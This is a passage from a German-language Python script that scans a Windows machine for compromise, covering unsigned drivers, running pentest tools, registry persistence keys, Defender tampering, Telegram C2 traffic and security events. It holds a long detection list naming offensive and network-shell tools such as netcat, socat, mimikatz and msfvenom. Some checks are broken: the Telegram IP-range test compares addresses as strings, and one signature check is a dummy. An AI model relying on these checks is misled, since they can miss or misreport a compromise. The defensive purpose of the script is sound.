    print("\n[Sven prüft deine Kernel-Treiber – auf Schnüffler und Bastler-Kram]")

    # 1. Treiber per driverquery abrufen (schnell, CSV, keine Detailverrenkungen)
    try:
        raw = subprocess.check_output(
            ["driverquery", "/v", "/fo", "csv"],
            text=True, errors="ignore"
        )
    except Exception:
        print("Sven sagt: ❌ 'driverquery' ging schief. Admin? Antivirenblockade? Oder kein Windows?")
        return

    # 2. CSV einlesen – robust gegen verschiedene Sprachversionen
    reader = csv.DictReader(io.StringIO(raw))
    if not reader.fieldnames:
        print("Sven sagt: Keine Treiberdaten gefunden. Das ist verdächtig leer.")
        return

    treiber = []
    # Möglichst viele mögliche Feldnamen für verschiedene Windows-Sprachen
    for row in reader:
        image_name = (row.get("Image Name") or row.get("Bildname") or row.get("Bild Name") or "").strip()
        display_name = (row.get("Display Name") or row.get("Anzeigename") or "").strip() or image_name
        raw_path = (row.get("Path") or row.get("Pfad") or "").strip()
        if not raw_path.lower().endswith(".sys"):
            continue
        treiber.append({"name": image_name, "display": display_name, "path": raw_path})

    if not treiber:
        print("Sven sagt: Keine Treiber gefunden. Ist das Windows oder ein besonders harter Tails-Clone?")
        return

    # Basis für Systemtreiber
    system_paths = [
        Path(r"C:\Windows\System32\drivers").resolve().as_posix().lower(),
        Path(r"C:\Windows\system32\drivers").resolve().as_posix().lower(),
        Path(r"C:\Windows\System32").resolve().as_posix().lower(),
        Path(r"C:\Windows\system32").resolve().as_posix().lower()
    ]

    # 3. Durchlauf und Analyse
    found_suspects = False
    for drv in treiber:
        name = drv["name"]
        display = drv["display"]
        # Bereinige typische "verwirrte" Pfade wie "\??\C:\..."
        raw_path = drv["path"].replace("\\??\\", "").replace("\\SystemRoot\\", r"C:\Windows\\")
        # Normiere Schrägstriche für die Path-Klasse
        raw_path = raw_path.replace("\\", "/")
        p = Path(raw_path)

        # Existiert Datei überhaupt?
        if not p.is_file():
            print(f"⚠️ '{name}' ({display}) – Datei fehlt oder ist nicht lesbar: {raw_path}")
            continue

        # Microsoft Systemtreiber überspringen (spart Zeit, Fokus auf Fremdzeug)
        if any(p.as_posix().lower().startswith(sp) for sp in system_paths):
            continue

        # Nur den Status prüfen, nicht den Zertifikatsinhalt (Speed! Privacy! Sarkasmus!)
        ps_cmd = (
            f"$s=Get-AuthenticodeSignature -FilePath '{p.as_posix()}'; "
            "Write-Output $s.Status"
        )
        try:
            result = subprocess.run(
                ["powershell", "-NoProfile", "-Command", ps_cmd],
                capture_output=True, text=True, timeout=8
            )
            status = result.stdout.strip().splitlines()[0] if result.stdout else "Unknown"
        except subprocess.TimeoutExpired:
            print(f"⚠️ '{name}' ({display}) – Signaturprüfung TIMEOUT! Treiber zu geheim oder Windows hat einen Kater?")
            continue
        except Exception:
            status = "Unknown"

        # Bewertung
        if status == "Valid":
            print(f"✔️ '{name}' ({display}) – sauber signiert, wenigstens das!")
        elif status in ("NotSigned", "HashMismatch"):
            print(f"❌ '{name}' ({display}) – NICHT signiert oder manipuliert! Pfad: {p.as_posix()}")
            found_suspects = True
        else:
            print(f"⚠️ '{name}' ({display}) – Unbekannter Signaturstatus: {status}. Pfad: {p.as_posix()}")
            found_suspects = True

    print("\nSven sagt: Treiber-Check fertig. Unsichere oder unsignierte Treiber = Red Flag. Hersteller-Webseite & Google fragen, nicht nur Tee trinken.")

    if not found_suspects:
        print("Sven sagt: Alles sieht gut aus – jedenfalls bei den Drittanbieter-Treibern. System bleibt misstrauisch.")

def detect_pentest_activity_strong():

    print("\n[Svenbot: Penetrationstest- & Living-off-the-Land-Checker (Pro-Version)]\n")

    # 1. Whitelists für Namen und „gute“ Pfade (anpassen/erweitern nach deinem System!)
    TOOL_WHITELIST = {
        "python.exe": [r"c:\python", r"c:\program files\python", r"c:\users", r"c:\programme\python"],
        "pwsh.exe":   [r"c:\program files\powershell", r"c:\windows\system32"],
        "powershell.exe": [r"c:\windows\system32", r"c:\windows\syswow64"],
        "cmd.exe":    [r"c:\windows\system32"],
        "code.exe":   [r"c:\users", r"c:\program files", r"c:\programme"],
        "nc.exe":     [r"c:\tools", r"c:\users"],
        "ncat.exe":   [r"c:\tools", r"c:\users"],
        "mshta.exe":  [r"c:\windows\system32"],
        "wscript.exe": [r"c:\windows\system32"],
        "cscript.exe": [r"c:\windows\system32"],
        "regsvr32.exe": [r"c:\windows\system32"],
        "rundll32.exe": [r"c:\windows\system32"],
        "explorer.exe": [r"c:\windows"],
        "chrome.exe": [r"c:\program files", r"c:\programme", r"c:\users"],
        "msedge.exe": [r"c:\program files", r"c:\programme"],
        "firefox.exe": [r"c:\program files", r"c:\programme", r"c:\users"],
        "discord.exe": [r"c:\users"],
        "steam.exe": [r"c:\program files", r"c:\programme", r"c:\users"],
        "taskmgr.exe": [r"c:\windows\system32"],
        "vlc.exe": [r"c:\program files", r"c:\programme"],
        "putty.exe": [r"c:\tools", r"c:\program files", r"c:\users"],
        "code.exe": [r"c:\users", r"c:\program files", r"c:\programme"],
        # ...weitere Tools/Verzeichnisse ergänzen nach Bedarf!
    }
    # Liste gefährlicher Tools (wie gehabt)
    DANGEROUS_TOOLS = set([
        "nmap", "masscan", "metasploit", "msfconsole", "msfvenom", "cobaltstrike", "beacon", "havoc",
        "sqlmap", "hydra", "john", "medusa", "crackmapexec", "impacket", "bloodhound", "rubeus", "mimikatz",
        "responder", "evil-winrm", "psexec", "pth", "smbmap", "sharpHound", "pupy", "empire",
        "burpsuite", "dirbuster", "gobuster", "wfuzz", "wpscan", "arachni", "zaproxy", "sqlninja",
        "websploit", "xsser", "commix", "sublist3r", "amass", "netcat", "nc", "ncat", "plink", "socat",
        "reverse_shell", "revsh", "shellter", "chisel", "earthworm", "iodine", "dns2tcp", "sshuttle", "rport",
        "proxifier", "msbuild", "bitsadmin", "certutil", "installutil", "wmic", "mshta", "remcos", "warzone",
        "revenge", "venom", "xrat", "spynet", "njrat", "quasar", "nanocore", "teamviewer", "anydesk", "vnc",
        "radmin", "beef", "empire", "fatrat", "setoolkit", "adfind", "powerview", "sharpad", "ldapsearch",
        "azurehound", "stormspotter", "fping", "hping", "zmap", "massdns", "theharvester", "enum4linux"
        # ... beliebig erweiterbar
    ])
    LOLBIN_NAMES = [
        "powershell.exe", "pwsh.exe", "cmd.exe", "wscript.exe", "cscript.exe", "regsvr32.exe", "rundll32.exe", "mshta.exe"
    ]

    # Ergebnis-Sammler (mit PID, für Details!)
    found = {"neutral": [], "potenziell_böse": [], "unbekannt": []}

    for proc in psutil.process_iter(['pid','name','exe','cmdline','ppid']):
        name = (proc.info.get('name') or "").lower()
        exe = (proc.info.get('exe') or "").lower()
        cmd = " ".join(proc.info.get('cmdline') or []).lower()
        pid = proc.info.get('pid')

        # 2A: Whitelist-Prüfung für bekannte Tools am richtigen Ort
        if name in TOOL_WHITELIST:
            good = any(exe.startswith(p.lower()) for p in TOOL_WHITELIST[name])
            if good:
                if "-encodedcommand" in cmd or "iex" in cmd or ("download" in cmd and "http" in cmd):
                    found["neutral"].append((name, exe, cmd, pid, "LOLBIN mit auffälligem Parameter (Beobachten!)"))
                continue  # Alles ok, nicht melden

            else:
                found["potenziell_böse"].append((name, exe, cmd, pid, "Bekannter Tool-Name, aber FALSCHER Pfad – mögliche Tarnung!"))
                continue

        # 2B: Bekannte gefährliche Tools überall → ALARM
        if name in DANGEROUS_TOOLS or any(tool in cmd for tool in DANGEROUS_TOOLS):
            found["potenziell_böse"].append((name, exe, cmd, pid, "Kritisches Pentest-/Malware-Tool erkannt!"))
            continue

        # 2C: LOLBINs an unbekanntem Ort oder mit seltsamen Parametern
        if name in LOLBIN_NAMES:
            if not exe or not any(exe.startswith(p.lower()) for p in TOOL_WHITELIST.get(name, [])):
                found["potenziell_böse"].append((name, exe, cmd, pid, "LOLBIN am ungewöhnlichen Ort – Tarnung oder Missbrauch möglich!"))
            elif "-encodedcommand" in cmd or "iex" in cmd or ("download" in cmd and "http" in cmd):
                found["neutral"].append((name, exe, cmd, pid, "LOLBIN mit auffälligem Parameter (Beobachten!)"))
            continue

        # 2D: Prozesse aus User-Verzeichnissen
        if exe and any(x in exe for x in ["appdata", "temp", "downloads"]):
            found["unbekannt"].append((name, exe, cmd, pid, "Ungewöhnlicher Fund: Prozess aus User-Verzeichnis!"))
            continue

    # 3. Details-Analyse: Parent, Netzwerk, Signatur
    def analyse_prozess_details(name, exe, pid):
        details = []
        try:
            proc = psutil.Process(pid)
            ppid = proc.ppid()
            parent = psutil.Process(ppid)
            parent_name = parent.name()
            parent_exe = parent.exe()
            details.append(f"Elternprozess: {parent_name} ({parent_exe})")
        except Exception:
            details.append("Elternprozess: unbekannt")

        netzinfo = []
        try:
            for c in proc.connections(kind='inet'):
                if c.status == 'ESTABLISHED' and c.raddr:
                    netzinfo.append(f"{c.raddr.ip}:{c.raddr.port}")
            if netzinfo:
                details.append(f"Netzwerk: {' | '.join(netzinfo)}")
            else:
                details.append("Netzwerk: keine aktiven Verbindungen")
        except Exception:
            details.append("Netzwerk: n/a")

        try:
            if exe and os.path.exists(exe):
                if "windows" in exe or "python" in exe:
                    details.append("Signatur: wahrscheinlich ok (Dummy)")
                else:
                    details.append("Signatur: unbekannt/nicht geprüft")
            else:
                details.append("Signatur: n/a")
        except Exception:
            details.append("Signatur: Fehler beim Prüfen")
        return details

    # 4. Ausgabe nach Kategorie (mit Details)
    if found["potenziell_böse"]:
        print("🚨 Potentiell BÖSE Prozesse (Tarnung, Hacktools, Missbrauch):")
        for name, exe, cmd, pid, grund in found["potenziell_böse"]:
            print(f"   ⚠️ {name} | Pfad: {exe}\n      → {grund}\n      → CMD: {cmd}")
            details = analyse_prozess_details(name, exe, pid)
            for d in details:
                print(f"         {d}")
            print()
    if found["neutral"]:
        print("🟡 Prozesse zum Beobachten (LOLBINs mit Parametern):")
        for name, exe, cmd, pid, grund in found["neutral"]:
            print(f"   ℹ️ {name} | Pfad: {exe}\n      → {grund}\n      → CMD: {cmd}")
            details = analyse_prozess_details(name, exe, pid)
            for d in details:
                print(f"         {d}")
            print()
    if found["unbekannt"]:
        print("❓ Unbekannte Funde (aus AppData/Temp, nicht klassifiziert):")
        for name, exe, cmd, pid, grund in found["unbekannt"]:
            print(f"   ❓ {name} | Pfad: {exe}\n      → {grund}\n      → CMD: {cmd}")
            details = analyse_prozess_details(name, exe, pid)
            for d in details:
                print(f"         {d}")
            print()

    if not any(found.values()):
        print("✅ Keine auffälligen oder getarnten PenTest-/Malware-Prozesse gefunden.\n")
    else:
        print("\nSven sagt: Alles was rot oder gelb ist, solltest du einzeln prüfen (Pfad, Parent-Prozess, Verhalten, ggf. Hash/Sig online checken).\n")

    print("Svenbot-Ende: Penetrationstest-Check abgeschlossen!\n")

def detect_registry_backdoors():
    print("\n[Sven sucht Registry-Backdoors: IFEO, RunOnceEx & Co. – die dunkle Seite der Autostarts]")
    suspicious = False

    # Registry-Schlüssel und Pfade, die häufig für Persistence/Backdoors missbraucht werden:
    REGKEYS = [
        # IFEO (Image File Execution Options, inkl. Debugger Hijacking)
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"),
        # RunOnceEx
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx"),
        # SilentProcessExit (oft für Stealth-Abwürfe & Monitoring)
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit"),
    ]

    def list_subkeys(hive, path):
        subkeys = []
        try:
            with winreg.OpenKey(hive, path, 0, winreg.KEY_READ) as key:
                for i in range(0, winreg.QueryInfoKey(key)[0]):
                    subkeys.append(winreg.EnumKey(key, i))
        except FileNotFoundError:
            pass
        except PermissionError:
            print(f"Sven sagt: Kein Zugriff auf {path} – Adminrechte fehlen?")
        return subkeys

    def list_values(hive, path):
        values = []
        try:
            with winreg.OpenKey(hive, path, 0, winreg.KEY_READ) as key:
                for i in range(0, winreg.QueryInfoKey(key)[1]):
                    values.append(winreg.EnumValue(key, i))
        except FileNotFoundError:
            pass
        except PermissionError:
            print(f"Sven sagt: Kein Zugriff auf {path} – Adminrechte fehlen?")
        return values

    # 1. IFEO: Image File Execution Options (Debugger-Hijacking)
    hive, base_path = REGKEYS[0]
    subkeys = list_subkeys(hive, base_path)
    if not subkeys:
        print("Sven sagt: IFEO-Schlüssel ist jungfräulich – keine Umleitungen gefunden.")
    else:
        print("Sven sagt: IFEO-Subkeys entdeckt – hier könnten Debugger/Backdoors hängen!")
        for exe in subkeys:
            key_path = f"{base_path}\\{exe}"
            vals = list_values(hive, key_path)
            for name, val, vtype in vals:
                # "Debugger" ist der Klassiker für Hijacks
                if name.lower() == "debugger":
                    print(f"⚠️ IFEO-Debugger gesetzt für '{exe}': {val}")
                    print(" ➤ Das sorgt dafür, dass beim Starten dieser EXE stattdessen das hier ausgeführt wird!")
                    suspicious = True
                # Alternative Persistence/Monitoring-Tricks
                if name.lower().startswith("monitoring"):
                    print(f"⚠️ IFEO-Monitoring-Wert entdeckt für '{exe}': {val}")
                    suspicious = True
                # Alle weiteren Werte trotzdem listen
                if name.lower() not in ("debugger", "monitoring"):
                    print(f"ℹ️ IFEO-Wert '{name}' bei '{exe}': {val}")

    # 2. RunOnceEx
    hive, base_path = REGKEYS[1]
    subkeys = list_subkeys(hive, base_path)
    if not subkeys:
        print("Sven sagt: RunOnceEx ist sauber – kein böser Zauber bei Systemstart.")
    else:
        print("Sven sagt: RunOnceEx-Subkeys gefunden. Hier werden Programme beim nächsten Neustart automatisch ausgeführt:")
        for sub in subkeys:
            key_path = f"{base_path}\\{sub}"
            vals = list_values(hive, key_path)
            for name, val, vtype in vals:
                print(f"⚠️ RunOnceEx-Autostart: [{name}] → {val}")
                if any(x in str(val).lower() for x in ["powershell", ".ps1", ".bat", ".exe", "cmd", "mshta"]):
                    print(" ➤ Verdächtiger Payload! Prüfen, ob das beabsichtigt ist.")
                    suspicious = True

    # 3. SilentProcessExit (Advanced Persistence)
    hive, base_path = REGKEYS[2]
    subkeys = list_subkeys(hive, base_path)
    if not subkeys:
        print("Sven sagt: SilentProcessExit hat keinen Eintrag – keine Silent Backdoors entdeckt.")
    else:
        print("Sven sagt: SilentProcessExit-Subkeys gefunden! Hier könnten Prozesse nach Beenden automatisch Payloads nachladen:")
        for exe in subkeys:
            key_path = f"{base_path}\\{exe}"
            vals = list_values(hive, key_path)
            for name, val, vtype in vals:
                print(f"⚠️ SilentProcessExit-Wert: [{exe}] {name} = {val}")
                if "launch" in name.lower() or "monitoring" in name.lower():
                    print(" ➤ Expliziter Launch/Monitor-Befehl. Mögliches Persistenz-Feature.")
                    suspicious = True

    # 4. (Optional) Info für weniger erfahrene Nutzer
    print("\nErklärung für Menschen ohne Registry-Phobie:")
    print("- IFEO (Image File Execution Options): Wird eigentlich für Debugging genutzt, kann aber jeden EXE-Start umleiten – beliebt für Backdoors.")
    print("- RunOnceEx: Programme, die einmalig beim nächsten Neustart automatisch ausgeführt werden. Kann für Installer – oder Angriffe – genutzt werden.")
    print("- SilentProcessExit: Weniger bekannt, aber mächtig – ermöglicht, dass ein Prozess nach seinem normalen Ende noch etwas anderes (z. B. Schadcode) ausführt.")

    if not suspicious:
        print("\nSven sagt: ✅ Keine offensichtlichen Registry-Backdoors gefunden. Heute kein Registry-Zauber am Werk.")
    else:
        print("\nSven sagt: 🚨 Verdächtige Registry-Einträge gefunden. Prüfe die angezeigten Pfade/Werte GENAU!")

def detect_av_edr_bypass():
    import os, subprocess, psutil, winreg

    print("\n[Sven scannt auf AV-/EDR-Bypass und Stealth-Tricks…]")
    suspicious = False

    # 1. Defender & AV Registry-Keys (ohne TamperProtection!)
    def reg_check(hive, path, value, should_warn=True, expected_off=0):
        try:
            with winreg.OpenKey(hive, path) as key:
                data, typ = winreg.QueryValueEx(key, value)
                if should_warn and str(data) != str(expected_off):
                    print(f"⚠️ Registry: [{path}] – {value} = {data} (sollte {expected_off} sein!)")
                    nonlocal suspicious
                    suspicious = True
                return data
        except FileNotFoundError:
            return None
        except PermissionError:
            print(f"Sven sagt: Kein Zugriff auf Registry-Schlüssel {path} – Adminrechte nötig!")
        return None

    defender_checks = [
        # (Hive, Key, Value, Warn, Expected Off Value)
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection", "DisableRealtimeMonitoring", True, 0),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender", "DisableAntiSpyware", True, 0),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender", "DisableAntiVirus", True, 0),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", True, 0),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableRealtimeMonitoring", True, 0),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiVirus", True, 0),
    ]

    print("\n[Registry-Checks auf Defender/AV-Manipulation:]")
    reg_warn = False
    for hive, key, value, warn, expected in defender_checks:
        data = reg_check(hive, key, value, warn, expected)
        if data is not None and str(data) != str(expected):
            print(f"Sven sagt: ⚠️ Manipulation erkannt: {key}\\{value} = {data} (Sollte {expected} sein!)")
            reg_warn = True
    if not reg_warn:
        print("Sven sagt: Defender-Registry sieht normal aus (keine offensichtliche Manipulation).")

    # 2. Prozess-Pfad-Prüfung – EDR Evasion
    critical_procs = {
        "csrss.exe":    [r"%SystemRoot%\System32"],
        "smss.exe":     [r"%SystemRoot%\System32"],
        "winlogon.exe": [r"%SystemRoot%\System32"],
        "services.exe": [r"%SystemRoot%\System32"],
        "lsass.exe":    [r"%SystemRoot%\System32"],
        "explorer.exe": [r"%SystemRoot%"],
    }
    print("\n[Pfad-Check kritischer Prozesse:]")
    legit_paths = {k: [os.path.normcase(os.path.expandvars(p)) for p in v] for k, v in critical_procs.items()}

    suspicious_proc = False
    for proc in psutil.process_iter(['name','exe','pid','create_time']):
        try:
            name = proc.info['name'].lower()
            exe = proc.info['exe']
            if name not in legit_paths or not exe:
                continue
            pfad = os.path.normcase(os.path.normpath(exe))
            legit = any(pfad.startswith(lp) for lp in legit_paths[name])
            if not legit:
                print(f"⚠️ {name} läuft an UNGEWÖHNLICHEM Ort: {pfad} (PID {proc.info['pid']})")
                print(" ➤ Das ist fast immer ein Stealth- oder EDR-Bypass-Trick (Malware tarnt sich als Systemprozess).")
                suspicious_proc = True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue
    if not suspicious_proc:
        print("Sven sagt: Alle kritischen Prozesse an ihrem gewohnten Platz. EDR-Bypass nicht sichtbar.")

    # 3. Defender/Security Center Service Status prüfen
    try:
        print("\n[Status des Defender-/Sicherheitsdienstes:]")
        result = subprocess.check_output("sc query WinDefend", shell=True, text=True)
        if "RUNNING" in result:
            print("Sven sagt: WinDefend läuft – Schutz aktiv (außer Registry wurde manipuliert).")
        else:
            print("Sven sagt: Defender-Service nicht aktiv! Das System ist weitgehend ungeschützt.")
    except Exception as e:
        print("Sven sagt: Konnte Defender-Service nicht abfragen. Vielleicht schon zu spät?")

    # 4. Andere Antivirenprodukte erkennen
    print("\n[AV-Status-Check (Security Center) – erkenne andere Virenscanner:]")
    try:
        result = subprocess.check_output(
            'powershell "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select displayName,productState"',
            shell=True, text=True, errors="ignore"
        )
        if "displayName" in result:
            print(result)
            if "Windows Defender" not in result and result.strip():
                print("⚠️ Achtung: Ein anderer AV ist aktiv! Eventuell ist Defender deshalb deaktiviert.")
        else:
            print("Sven sagt: Konnte keinen aktiven AV finden.")
    except Exception as e:
        print(f"Sven sagt: AV-Check (Security Center) nicht möglich: {e}")

    # 5. Testsigning-Modus
    print("\n[Testsigning-Check:]")
    try:
        output = subprocess.check_output('bcdedit', shell=True, text=True, errors="ignore")
        if "testsigning" in output and "Yes" in output:
            print("⚠️ Achtung: Windows läuft im Testsigning-Modus! Unsigned Treiber können geladen werden – sehr gefährlich.")
        else:
            print("Sven sagt: Kein Testsigning-Modus aktiv – alles normal.")
    except Exception as e:
        print(f"Sven sagt: Testsigning konnte nicht geprüft werden: {e}")

    # 6. Bekannte EDR/AV-Treiber im Kernel
    print("\n[Kernel-Treiber-Check auf bekannte EDR/AV-Treiber:]")
    driver_keywords = ["kaspersky", "symantec", "bitdefender", "avast", "sophos", "crowdstrike", "sentinel", "carbonblack", "eset", "mcafee", "drweb", "defender"]
    try:
        drivers = subprocess.check_output('driverquery', shell=True, text=True, errors="ignore").lower()
        found = []
        for k in driver_keywords:
            if k in drivers:
                found.append(k)
        if found:
            print(f"Gefundene (aktive) AV/EDR-Treiber: {', '.join(found)}")
        else:
            print("Sven sagt: Keine verdächtigen/klassischen AV-/EDR-Treiber im Kernel aktiv.")
    except Exception as e:
        print(f"Sven sagt: Treiber konnten nicht geprüft werden: {e}")

    # 7. Erklärung für Menschen ohne Security-Background
    print("\nErklärung (auch für Boomer):")
    print("- Angreifer versuchen häufig, Defender oder andere Schutzmechanismen gezielt per Registry abzuschalten.")
    print("- Viele aktuelle Malware-Varianten kopieren sich als Systemprozess (csrss.exe, smss.exe etc.) in andere Ordner, um EDRs und AVs zu umgehen.")
    print("- Testsigning-Modus erlaubt das Laden unsignierter Treiber – das ist sehr gefährlich und sollte nie aktiv sein.")
    print("- Sieh dir alle obigen Warnungen sehr genau an – sie können auf einen aktiven oder erfolgreichen Angriff hindeuten.")
    print("- Falls etwas entdeckt wurde: System **sofort** isolieren und forensisch untersuchen!")

    if not reg_warn and not suspicious_proc:
        print("\nSven sagt: ✅ Keine offensichtlichen Bypass-/Stealth-Tricks entdeckt. Für heute schläft die Malware noch.")
    else:
        print("\nSven sagt: 🚨 Mindestens eine Stealth-/Bypass-Technik entdeckt! Sofort prüfen – das System könnte kompromittiert sein.")

def detect_telegram_c2():

    # Bekannte Telegram-IP-Ranges (Stand 2024, kannst du ergänzen!)
    TELEGRAM_IP_RANGES = [
        ("91.108.4.0", "91.108.8.255"),
        ("149.154.160.0", "149.154.175.255"),
        ("185.76.151.0", "185.76.151.255"),
        # ... nach Bedarf ergänzen (siehe https://core.telegram.org/mtproto/server_ips)
    ]
    TELEGRAM_DOMAINS = [
        "telegram.org", "t.me", "telegram.me", "api.telegram.org", "core.telegram.org"
    ]

    print("\n[Svenbot: Telegram-C2-Erkennung]\n")
    found = False

    # 1. Prozessanalyse: Ungewöhnliche PowerShell/Python-Aufrufe zu Telegram-Domains
    print("Prozess- & Commandline-Analyse:")
    for proc in psutil.process_iter(['pid','name','cmdline']):
        try:
            name = (proc.info['name'] or "").lower()
            cmd  = " ".join(proc.info.get('cmdline') or []).lower()
            if any(domain in cmd for domain in TELEGRAM_DOMAINS):
                print(f"⚠️ Prozess {name} (PID {proc.info['pid']}) nutzt Telegram-Domain in der Kommandozeile:")
                print(f"    {cmd}")
                found = True
            # Powershell/Python, die HTTP zu Telegram machen
            if (name in ["powershell.exe", "python.exe"]) and ("telegram" in cmd or "t.me" in cmd):
                print(f"⚠️ Verdächtiger Aufruf: {name} → {cmd}")
                found = True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    # 2. Netzwerkverbindungen zu Telegram-IP-Ranges
    print("\nNetzwerk-Analyse (aktive Verbindungen):")
    for conn in psutil.net_connections(kind='inet'):
        if conn.status != 'ESTABLISHED' or not conn.raddr:
            continue
        remote_ip = conn.raddr.ip
        for ip_start, ip_end in TELEGRAM_IP_RANGES:
            if ip_start <= remote_ip <= ip_end:
                try:
                    pname = psutil.Process(conn.pid).name()
                except Exception:
                    pname = "?"
                print(f"⚠️ Verbindung von Prozess {pname} (PID {conn.pid}) zu Telegram-IP: {remote_ip}")
                found = True

    if not found:
        print("Sven sagt: Keine verdächtigen Telegram-C2-Spuren entdeckt.\n")
    else:
        print("\nSven sagt: ⚠️ Mögliche Telegram-C2-Nutzung erkannt! Unbedingt prüfen.\n")

def detect_eventlog_security():
    print("\n[Sven analysiert dein Security-Eventlog – es gibt kein Versteck…]")

    # Zeithorizont: wie viele Tage zurück?
    TAGE = 7

    more_ps_events = [
        (4627, "Group membership information"),
        (4634, "User logged off"),
        (4647, "User initiated logoff"),
        (4648, "Logon with explicit credentials (pass-the-hash/walk-in)"),
        (4649, "Replay attack detected"),
        (4657, "Registry value changed"),
        (4662, "Object access attempted"),
        (4663, "File/folder/object accessed"),
        (4670, "Permissions on object changed"),
        (4673, "Privileged service called"),
        (4674, "Privileged object operation attempted"),
        (4688, "New process created"),
        (4689, "Process ended"),
        (4697, "Service installed"), 
        (4698, "Scheduled task created"),
        (4699, "Scheduled task deleted"),
        (4700, "Scheduled task enabled"),
        (4701, "Scheduled task disabled"),
        (4702, "Scheduled task updated"),
        (4719, "Audit policy changed"),
        (4725, "User account disabled"),
        (4726, "User account deleted"),
        (4738, "User account changed"),
        (4741, "Computer account created"),
        (4742, "Computer account changed"),
        (4743, "Computer account deleted"),
        (4756, "User added to universal group"),
        (4767, "User account unlocked"),
        (4771, "Kerberos pre-auth failed"),
        (4776, "NTLM authentication attempted"),
        (5140, "Shared object accessed (SMB share)"),
        (5142, "A network share object was added"),
        (5144, "Network share object was deleted"),
        (5156, "Allowed network connection"),
        (5158, "Network connection closed"),
        (5168, "Encrypted volume mounted"),
        (5376, "Credential Manager credentials backed up"),
        (5379, "Credential Manager credentials restored"),
        (1100, "Eventlog service shutdown"),        # Log aus
        (1101, "Audit events dropped"),
        (1105, "Event log automatic backup"),
        (4616, "System time changed"),
        (4621, "Administrator recovered encrypted file"),
        (4640, "User attempted to access non-existent account"),
        (4964, "Special group logon"),
        (5058, "Key file operation (crypto)"),
        (5059, "Key migration operation (crypto)"),
        (6416, "Firewall rule changed"),
        (6424, "Security authority integrity failure"),
    ]

    # PowerShell-Kommando für gezielte Security-Events der letzten x Tage
    ps_events = [
        # (EventID, Beschreibung)
        (4625, "Fehlgeschlagene Anmeldung"),
        (4624, "Erfolgreiche Anmeldung"),
        (4720, "Neues Benutzerkonto angelegt"),
        (4722, "Benutzerkonto aktiviert"),
        (4723, "Kennwort eines Kontos geändert"),
        (4724, "Kennwort eines Kontos zurückgesetzt"),
        (4728, "Benutzer zu lokaler Admin-Gruppe hinzugefügt"),
        (4729, "Benutzer aus lokaler Admin-Gruppe entfernt"),
        (7045, "Neuer Dienst installiert"),
        (1102, "Security-Log gelöscht/geleert"),
        (4672, "Spezielle Admin-Anmeldung"),
        (4732, "Benutzer zur Gruppe hinzugefügt"),
        (4733, "Benutzer aus Gruppe entfernt"),
        (4740, "Konto gesperrt"),
        (4768, "TGT-Anfrage (Kerberos)"),
        (4769, "Service Ticket (Kerberos)"),
    ]

    # PowerShell-Filterstring bauen
    event_ids = ",".join(str(eid) for eid, _ in ps_events)
    since = (datetime.datetime.now() - datetime.timedelta(days=TAGE)).strftime("%Y-%m-%dT%H:%M:%S")
    ps = (
        f"$events = Get-WinEvent -FilterHashtable @{{LogName='Security'; Id={{{event_ids}}}; StartTime='{since}'}} | "
        "Select-Object TimeCreated, Id, Message | Sort-Object TimeCreated;"
        "$events | ForEach-Object { "
        "    Write-Output (($_.TimeCreated).ToString('s') + '|' + $_.Id + '|' + ($_.Message -replace '\\r|\\n', ' ')) "
        "}"
    )

    try:
        output = subprocess.check_output(['powershell', '-Command', ps], text=True, errors="ignore")
    except Exception as e:
        print(f"Sven sagt: Konnte Security-Events nicht abfragen – bist du Admin? Fehler: {e}")
        return

    # Daten verarbeiten
    lines = [l.strip() for l in output.splitlines() if l.strip()]
    events = []
    for l in lines:
        parts = l.split("|", 2)
        if len(parts) != 3:
            continue
        zeit, eid, msg = parts
        try:
            dt = datetime.datetime.fromisoformat(zeit)
        except Exception:
            dt = zeit
        events.append({
            "time": dt,
            "id": int(eid),
            "msg": msg.strip()
        })

    if not events:
        print(f"Sven sagt: Keine Security-Events der letzten {TAGE} Tage gefunden. Entweder ist dein System clean – oder jemand hat alles gelöscht!")
        return

    # Für Übersicht und Bewertung
    brute_force_count = 0
    service_installs = []
    user_creations = []
    admin_adds = []
    log_clears = []
    suspicious_logons = []
    locked_accounts = []
    suspect_events = []

    # Bewertungstexte nach Event-ID
    beschreibung = dict(ps_events)
    for ev in events:
        eid = ev["id"]
        time = ev["time"]
        msg = ev["msg"]

        # 4625: Fehlgeschlagene Anmeldung
        if eid == 4625:
            brute_force_count += 1
            if "Account Name:" in msg:
                user = re.search(r"Account Name:\s+([^\s]+)", msg)
                user = user.group(1) if user else "unbekannt"
                print(f"❗ Fehlgeschlagene Anmeldung ({user}) um {time}")
            else:
                print(f"❗ Fehlgeschlagene Anmeldung um {time}")
            if brute_force_count % 10 == 0:
                print("Sven sagt: ⚠️ Sehr viele Logon-Fails – Brute-Force-Angriff möglich!")
        # 4720: Neuer Benutzer
        elif eid == 4720:
            user = re.search(r"Account Name:\s+([^\s]+)", msg)
            user = user.group(1) if user else "unbekannt"
            user_creations.append((time, user))
            print(f"⚠️ Neuer Benutzer wurde erstellt: {user} ({time})")
        # 4728, 4732: Benutzer zur Gruppe hinzugefügt
        elif eid in (4728, 4732):
            user = re.search(r"Member:\s+([^\s]+)", msg)
            group = re.search(r"Group:\s+([^\s]+)", msg)
            user = user.group(1) if user else "unbekannt"
            group = group.group(1) if group else "unbekannt"
            admin_adds.append((time, user, group))
            print(f"⚠️ Benutzer {user} wurde zu Gruppe {group} hinzugefügt ({time})")
        # 7045: Dienst installiert
        elif eid == 7045:
